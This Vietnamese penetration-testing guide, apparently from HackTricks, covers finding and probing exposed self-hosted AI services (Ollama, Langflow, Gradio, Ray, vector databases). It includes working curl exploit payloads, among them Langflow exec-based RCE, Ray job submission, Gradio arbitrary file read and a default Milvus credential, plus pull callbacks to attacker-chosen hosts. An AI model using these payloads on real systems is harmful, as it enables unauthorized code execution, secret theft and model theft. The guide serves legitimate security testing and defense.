# Các dịch vụ AI tự host bị lộ

{{#include ../banners/hacktricks-training.md}}

Các nhóm xây dựng tính năng AI thường tự chạy model runner, công cụ tạo agent, giao diện demo, cụm máy tính và cơ sở dữ liệu vector. Nhiều công cụ trong số này được thiết kế để dùng trên laptop hoặc trong mạng lab khép kín, nên **mặc định không có xác thực** hoặc đi kèm lối tắt xác thực đã bật sẵn. Khi kẻ tấn công truy cập được một dịch vụ như vậy, tác động thường thuộc một trong các nhóm sau:

- Dùng miễn phí GPU và model, đồng thời đánh cắp model riêng tư.
- Rò rỉ prompt, tài liệu và embedding.
- Rò rỉ bí mật từ môi trường tiến trình (khóa nhà cung cấp LLM, thông tin xác thực cloud).
- Thực thi mã, vì một số API trong các công cụ này chạy mã **như một tính năng**.

Trang này mô tả cách tìm các dịch vụ đó và những gì cần kiểm tra trên từng loại API. Để tăng cường bảo mật cho inference server tự host và lỗi leak trên llama.cpp `/slots`, xem [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Để tìm hiểu về các tệp model độc hại, xem [AI Models RCE](AI-Models-RCE.md).

## Nhận diện dấu vân tay

Gửi các request này mà không có thông tin xác thực. Phản hồi JSON có các trường như mong đợi sẽ giúp xác định sản phẩm, và thường cả phiên bản, từ đó biết cần áp dụng những bước kiểm tra nào bên dưới. Các port là mặc định theo tài liệu hoặc được dùng trong ví dụ chạy chính thức.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Sản phẩm | Port thường dùng | Request không cần xác thực | Dấu hiệu nhận diện |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON phiên bản, danh sách model cục bộ |
| Langflow | 7860 | `GET /api/v1/version` | JSON phiên bản Langflow |
| Gradio | 7860 | `GET /config` | Cấu hình ứng dụng có phiên bản Gradio và ID component |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, danh sách job đã gửi |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Giá trị heartbeat, phiên bản Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Phiên bản Qdrant, danh sách collection |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Phiên bản Weaviate, các class |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Danh sách collection hoặc lỗi xác thực |

Các dịch vụ này cũng thường được công bố phía sau reverse proxy dưới một tiền tố đường dẫn (ví dụ `/ollama/` hoặc `/ray/`), vì vậy hãy gửi lại các request với mọi tiền tố tìm thấy trong các JavaScript bundle hoặc tài liệu API.

## API inference và quản lý model không cần xác thực

Model runner thường cung cấp một REST API duy nhất, kết hợp các route inference với các route quản trị. Ollama là một ví dụ điển hình. Công cụ này không có xác thực tích hợp và mặc định bind vào `127.0.0.1:11434`, trong khi `OLLAMA_HOST` thay đổi địa chỉ bind.<sup>[[1]](#references)[[15]](#references)</sup> Docker image chính thức đặt `OLLAMA_HOST=0.0.0.0:11434` bên trong container, khai báo `EXPOSE 11434` và không có chỉ thị `USER`, nên server chạy với quyền root trong container.<sup>[[16]](#references)</sup> `EXPOSE` không công bố port trên host, nên khả năng truy cập từ host phụ thuộc vào cách triển khai. Các lệnh `docker run` được tài liệu hướng dẫn sử dụng `-p 11434:11434`, và Docker công bố ánh xạ như vậy trên mọi giao diện của host trừ khi chỉ định IP host.<sup>[[17]](#references)[[18]](#references)</sup>

Mỗi nhóm route cung cấp cho kẻ tấn công những gì:<sup>[[2]](#references)</sup>

| Routes | Tác động khi không cần xác thực |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Danh sách model cục bộ và đang được tải, bao gồm cả model tùy chỉnh riêng tư |
| `POST /api/show` | Chi tiết model, bao gồm Modelfile, template và **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Chạy inference miễn phí trên phần cứng của nạn nhân |
| `POST /api/pull`, `/api/push` | Khiến server tải model từ hoặc tải model lên registry do kẻ tấn công chỉ định |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Tạo, ghi đè hoặc xóa model |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Một danh sách model được trả về mà không cần credentials đã chứng minh dịch vụ bị lộ. Các model tùy chỉnh thường chứa system prompt nội bộ trong `/api/show`. Một pull về host của bạn chứng minh server lấy manifest từ các registry do attacker chọn. `/api/push` về registry của bạn biến việc lộ dịch vụ thành hành vi đánh cắp model. Không gọi các route tạo hoặc xóa trên mục tiêu thật.

Các lần pull từ registry cũng là bề mặt tấn công parser, vì server lưu blob bằng các giá trị lấy từ manifest từ xa. Trong Probllama (CVE-2024-37032, được khắc phục trong Ollama 0.1.34), `digest` trong manifest được dùng làm tên file mà không được xác thực. Do đó, registry độc hại có thể ghi file bên ngoài thư mục blobs bằng các chuỗi `../`. Đẩy một manifest cài cắm có digest trỏ đến file cục bộ sẽ làm rò rỉ file đó đến registry của attacker. Wiz đạt được RCE trong Docker, nơi server chạy với quyền root, bằng cách ghi một thư viện dùng chung và thêm nó vào `/etc/ld.so.preload`, sau đó gọi `/api/chat` để một tiến trình mới tải thư viện đó.<sup>[[15]](#references)</sup> Khi runner có thể pull từ các registry tùy ý, hãy kiểm tra cách nó chuyển các trường trong manifest thành đường dẫn.

## APIs được thiết kế để thực thi code

### APIs gửi job

Các framework tính toán phân tán xem việc thực thi code là tính năng chính. Ray Jobs API trên cổng dashboard (8265) chấp nhận lệnh shell `entrypoint` và chạy lệnh đó trên cluster.<sup>[[19]](#references)</sup> Nghiên cứu Oligo ShadowRay cho biết Jobs API không có authorization và dashboard bind vào `0.0.0.0`. CVE-2023-48022 tương ứng còn gây tranh cãi vì Ray được thiết kế để chỉ chạy trong mạng được kiểm soát.<sup>[[20]](#references)</sup> Ray đã bổ sung xác thực token tùy chọn (`RAY_AUTH_MODE=token`) trong phiên bản 2.52.0. Ray 2.59 bật tính năng này theo mặc định cho các cluster cục bộ được khởi chạy bằng `ray.init()`; `ray start --head` vẫn có thể khởi chạy mà không xác thực nếu không có token khả dụng. Ray công bố kế hoạch triển khai rộng hơn về xác thực mặc định trong phiên bản 2.61, vì vậy hãy kiểm tra phiên bản và chế độ khởi chạy đang triển khai thay vì mặc định cho rằng dashboard đang mở.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Các dashboard loại này cũng có những route phụ đáng để kiểm tra trên các phiên bản cũ. Trước Ray 2.8.1, `/log_proxy?url=` tải bất kỳ URL HTTP(S) nào (SSRF đến cloud metadata), còn `/api/v0/logs/file` chấp nhận đường dẫn `filename` tùy ý; cả hai đều không yêu cầu xác thực.<sup>[[8]](#references)</sup>

### Endpoint "validation" chạy các định nghĩa hàm

Các công cụ xây dựng agent chấp nhận component Python tùy chỉnh đôi khi "validate" code bằng cách phân tích nó với `ast` rồi chỉ chạy các định nghĩa hàm bằng `exec()`. Cách này không an toàn. Python đánh giá **decorator và giá trị đối số mặc định khi định nghĩa hàm**, vì vậy code đặt ở đó sẽ chạy ngay cả khi phần thân hàm không bao giờ được thực thi. `POST /api/v1/validate/code` của Langflow hoạt động theo cách này và không yêu cầu xác thực trước phiên bản 1.3.0 (CVE-2025-3248). Ném ra một exception chứa đầu ra của lệnh sẽ khiến endpoint trả đầu ra trong response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Kiểm tra mọi endpoint biên dịch, lint hoặc “kiểm tra” code người dùng để tìm mẫu này, và ưu tiên dùng DNS callback làm bằng chứng.

### Các route auto-login và token superuser mặc định

Các công cụ dành cho một người dùng thường có lối tắt tự động đăng nhập mọi khách truy cập bằng tài khoản administrator. Trong Langflow, khi bật `AUTO_LOGIN`, `GET /api/v1/auto_login` trả về token của superuser mặc định cho bất kỳ ai gọi endpoint. Khi tắt tính năng này, route trả lời `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 đến 1.10.0 mặc định bật tính năng này (CVE-2026-9103). Kết hợp nó với route xác thực code cần đăng nhập ở trên sẽ khôi phục RCE không cần xác thực (CVE-2026-9198, do Harish Kolla báo cáo).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Các gói phát hành chính thức và Docker image hiện tại đã tắt auto-login và yêu cầu mật khẩu superuser, nhưng các nhánh phát triển vẫn bật tính năng này.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Ngay cả khi không thực thi được code, token superuser vẫn cho phép truy cập mọi flow và thông tin xác thực của provider đã lưu. Để xem bước kiểm tra điều kiện tiên quyết liên quan trong kiểm thử tự động, hãy xem [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Các route phục vụ file và RPC trong giao diện demo ML

Các framework demo ML phục vụ file đã tải lên và file được tạo thông qua một route tổng quát, đồng thời cho phép frontend gọi các helper phía server của component. Gradio cung cấp `/config`, `/upload` và `/file=<path>` cho mục đích này.<sup>[[5]](#references)</sup> Có hai mẫu đáng kiểm tra trên mọi framework tương tự:

- **Traversal từ thư mục con tải lên:** nếu route file chỉ kiểm tra rằng đường dẫn bắt đầu bên trong thư mục tạm, hãy tải lên một file để tạo thư mục con, rồi thoát khỏi thư mục đó bằng `../` hoặc `%2e%2e%2f`. Gradio 4.0 đến 4.10 (CVE-2023-51449) dễ bị tấn công theo cách này.<sup>[[26]](#references)[[27]](#references)</sup> Gửi request bằng `curl --path-as-is` để client không chuẩn hóa đường dẫn.
- **Điều phối method tùy ý:** một endpoint gọi `getattr(component, fn_name)` với đầu vào do người dùng cung cấp sẽ cho phép attacker gọi các helper nội bộ. Trước phiên bản 4.13.0, `/component_server` của Gradio hoạt động theo cách này. Trong các phiên bản 4.3 đến 4.12, `move_resource_to_block_cache` sao chép mọi file cục bộ vào cache, nơi `/file=` có thể tải file xuống. Trong các phiên bản 3.47 đến 3.50.2, những helper khác cho phép đọc file và SSRF đọc toàn bộ nội dung.<sup>[[26]](#references)[[28]](#references)</sup> Server đã được vá sẽ trả lời `Function not found.` đối với các helper không được đánh dấu là server function.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Trên Hugging Face Spaces, secret của Space là các biến môi trường, vì vậy `/proc/self/environ` là file có giá trị nhất. Horizon3 đã đọc file này bằng header HTTP `Range`.<sup>[[26]](#references)</sup>

## Vector databases được RAG sử dụng

RAG lưu các đoạn trích từ tài liệu gốc, embedding và metadata của chúng trong vector database, rồi assistant đưa các kết quả hàng đầu vào prompt. Do đó, quyền đọc sẽ làm **lộ văn bản thuần của tài liệu riêng tư**. Quyền ghi cho phép kẻ tấn công chèn các đoạn trích sau đó được truy xuất vào prompt của người dùng khác, đây là prompt injection gián tiếp dai dẳng (xem [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Đối với vector database tự host, hãy kiểm tra xem đã cấu hình authentication chưa hoặc có bật anonymous access không:

- **Qdrant**: các instance tự triển khai lắng nghe trên mọi interface và không có authentication. Khi được cấu hình, key được đặt trong header `api-key` hoặc dưới dạng `Authorization: Bearer`. Có thể có key chỉ đọc và key theo từng collection.<sup>[[11]](#references)</sup>
- **Chroma**: authentication bị tắt theo mặc định. Token auth sử dụng `Authorization` hoặc `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: các request không có thông tin xác thực được xác thực là `user: anonymous` khi anonymous access được bật, và có các quyền mà user đó được cấp.<sup>[[30]](#references)</sup>
- **Milvus**: authentication bị tắt trừ khi `common.security.authorizationEnabled` là `true`. Khi được bật, user `root` mặc định có mật khẩu `Milvus` và định dạng token là `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Phản hồi chứa dữ liệu riêng tư mà không cần thông tin xác thực cho thấy dữ liệu đang bị lộ. Khi authentication được bật, hãy đánh giá riêng mọi tài khoản mặc định chưa được thay đổi:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Kiểm tra xem payload có chứa văn bản tài liệu, mã định danh người dùng hoặc tên tenant hay không. Để chứng minh có quyền ghi mà không làm nhiễm bẩn dữ liệu production, hãy tạo rồi xóa ngay một collection trống có tên rõ ràng, và chỉ thực hiện khi phạm vi cho phép.

Trên các server này, xác thực cũng có thể diễn ra quá muộn. Trong server FastAPI Python của Chroma (từ 1.0.0 đến ít nhất 1.5.8, CVE-2026-45829), route tạo collection khởi tạo embedding function do client cung cấp trước khi kiểm tra xác thực. Một cấu hình tham chiếu đến model Hugging Face do attacker kiểm soát với `trust_remote_code: true` đã chạy code của attacker ngay cả khi request bị từ chối. Rust frontend không bị ảnh hưởng.<sup>[[32]](#references)</sup> Khi request mang theo cấu hình model hoặc plugin, hãy thử gửi request không có thông tin xác thực và theo dõi xem có yêu cầu fetch ra ngoài đến repository model của bạn hay không.

## References

- [1] [Câu hỏi thường gặp về Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Tài liệu API của Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README của Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Mã nguồn Langflow - các endpoint API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Mã nguồn Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Mã nguồn Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Mã nguồn Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, phiên bản 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Mã nguồn Chroma - mặc định của Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Mã nguồn Chroma - các route của FastAPI server](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Bảo mật](https://qdrant.tech/documentation/security/)
- [12] [Đặc tả OpenAPI của Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Đặc tả OpenAPI của Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Kết nối đến Milvus Server](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Lỗ hổng Remote Code Execution của Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile của Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Tài liệu Docker của Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Xuất bản và mở các port](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Chiến dịch tấn công đầu tiên được biết đến nhắm vào workload AI, bị khai thác ngoài thực tế](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Xác thực token của Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Không an toàn ở bất kỳ tốc độ nào: Lạm dụng Python Exec để thực hiện RCE không cần xác thực trong Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Mã nguồn Langflow - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Khai thác lỗ hổng đọc file trong Gradio để đánh cắp secret từ Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Thông báo bảo mật Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit khắc phục `/component_server` của Gradio](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Xác thực gốc của Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Xác thực](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Xác thực quyền truy cập của người dùng](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast được phục vụ trước khi xác thực](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Bản tin bảo mật IBM - Remote Code Execution không cần xác thực thông qua bypass Auto-Login và xác thực code (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
